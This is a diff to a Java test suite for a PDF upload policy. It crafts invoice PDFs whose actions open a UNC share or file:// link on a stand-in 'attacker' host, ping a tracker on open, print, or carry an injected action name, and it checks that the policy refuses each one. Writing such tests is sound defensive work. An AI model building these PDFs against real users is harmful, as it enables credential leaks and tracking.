@@ -204,13 +204,22 @@ class PdfContentPolicyTest {
 
     @Test
     void anActionThatOpensSendsOrLoadsSomethingIsRefused() throws Exception {
-        for (String type : java.util.List.of("GoToE", "GoToR", "SubmitForm", "ImportData", "Rendition", "Made-Up")) {
+        // Naming a file is refused whatever the action's type.
+        for (String type : java.util.List.of("GoToE", "GoToR", "SubmitForm")) {
             refused(FileCategory.SUPPLIER_INVOICE, pdf(type + ".pdf", document -> {
                 var action = action(type);
                 action.setString(org.apache.pdfbox.cos.COSName.F, "\\\\attacker\\share\\x.pdf");
                 onPageOpen(document, action);
-            }), type + " action");
+            }), "opens another file");
         }
+        // Without one, by type: everything that is not navigation.
+        for (String type : java.util.List.of("GoToR", "SubmitForm", "ImportData", "Rendition")) {
+            refused(FileCategory.SUPPLIER_INVOICE, pdf(type + "-bare.pdf", document -> onPageOpen(document, action(type))),
+                    "a " + type + " action");
+        }
+        // A name the file made up is refused, and not repeated back as it was written.
+        refused(FileCategory.SUPPLIER_INVOICE, pdf("made-up.pdf", document -> onPageOpen(document, action("Made-Up<b>"))),
+                "an unknown action");
     }
 
     @Test
@@ -266,6 +275,61 @@ class PdfContentPolicyTest {
             uri.setURI("https://tracker.example/opened");
             document.getDocumentCatalog().setOpenAction(uri);
         }), "URI action");
+    }
+
+    @Test
+    void anAllowedActionThatNamesAFileOrAMenuItemIsRefused() throws Exception {
+        refused(FileCategory.SUPPLIER_INVOICE, pdf("thread.pdf", document -> {
+            var thread = action("Thread");
+            thread.setString(org.apache.pdfbox.cos.COSName.F, "\\\\attacker\\share\\x.pdf");
+            thread.setInt(org.apache.pdfbox.cos.COSName.D, 0);
+            document.getDocumentCatalog().getCOSObject().setItem(org.apache.pdfbox.cos.COSName.getPDFName("OpenAction"),
+                    thread);
+        }), "opens another file");
+        refused(FileCategory.SUPPLIER_INVOICE, pdf("print.pdf", document -> {
+            var print = action("Named");
+            print.setName(org.apache.pdfbox.cos.COSName.N, "Print");
+            onPageOpen(document, print);
+        }), "Named action");
+        refused(FileCategory.SUPPLIER_INVOICE, pdf("file-link.pdf", document -> {
+            var link = new PDAnnotationLink();
+            link.setRectangle(new PDRectangle(10, 10, 50, 50));
+            var uri = new org.apache.pdfbox.pdmodel.interactive.action.PDActionURI();
+            uri.setURI("file://attacker/share/x.pdf");
+            link.setAction(uri);
+            try {
+                document.getPage(0).getAnnotations().add(link);
+            } catch (java.io.IOException ex) {
+                throw new RuntimeException(ex);
+            }
+        }), "URI action");
+    }
+
+    @Test
+    void pageTurnsFormResetsAndAButtonsMouseUpLinkPass() throws Exception {
+        Path ordinary = pdf("ordinary.pdf", document -> {
+            var next = action("Named");
+            next.setName(org.apache.pdfbox.cos.COSName.N, "NextPage");
+            next.setItem(org.apache.pdfbox.cos.COSName.getPDFName("Next"), action("ResetForm"));
+            var link = new PDAnnotationLink();
+            link.setRectangle(new PDRectangle(10, 10, 50, 50));
+            link.setAction(new org.apache.pdfbox.pdmodel.interactive.action.PDActionURI());
+            ((org.apache.pdfbox.pdmodel.interactive.action.PDActionURI) link.getAction()).setURI("https://example.vn/tra-cuu");
+            var mouseUp = new org.apache.pdfbox.cos.COSDictionary();
+            var lookup = action("URI");
+            lookup.setString(org.apache.pdfbox.cos.COSName.getPDFName("URI"), "https://hoadondientu.gdt.gov.vn");
+            mouseUp.setItem(org.apache.pdfbox.cos.COSName.getPDFName("U"), lookup);
+            link.getCOSObject().setItem(org.apache.pdfbox.cos.COSName.AA, mouseUp);
+            try {
+                document.getPage(0).getAnnotations().add(link);
+            } catch (java.io.IOException ex) {
+                throw new RuntimeException(ex);
+            }
+            document.getDocumentCatalog().getCOSObject().setItem(org.apache.pdfbox.cos.COSName.getPDFName("OpenAction"),
+                    next);
+        });
+        assertThatCode(() -> PdfContentPolicy.check(FileCategory.SUPPLIER_INVOICE, "application/pdf", ordinary))
+                .doesNotThrowAnyException();
     }
 
     @Test
